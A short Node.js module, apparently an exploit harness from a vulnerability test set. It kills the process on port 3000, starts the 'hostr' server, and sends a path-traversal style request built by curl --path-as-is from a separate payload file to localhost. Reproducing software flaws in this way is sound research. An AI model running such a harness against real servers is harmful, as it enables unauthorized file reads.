const path = require("path"); // Add this line

function exploitFunction(payload) {
  const { execSync } = require("child_process");
  const { sleep } = require("sleep");

  // Clean up any previous processes
  try {
    execSync("fuser -k 3000/tcp");
  } catch (e) {}

  // Start the server
  execSync("node ./node_modules/hostr/bin/hostr", { stdio: 'inherit' });

  // Wait for the server to start
  sleep.sleep(2);

  // Craft the attack string
  const { getPayload } = require('./payload.js');
  const genstr = getPayload(); // Use the payload

  const attack_string = `curl -v --path-as-is "http://127.0.0.1:3000${genstr}"`;

  // Execute the attack
  const { exec } = require("child_process");
  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error executing command: ${error}`);
      return;
    }
    return stdout;
  });
}

module.exports = { exploitFunction };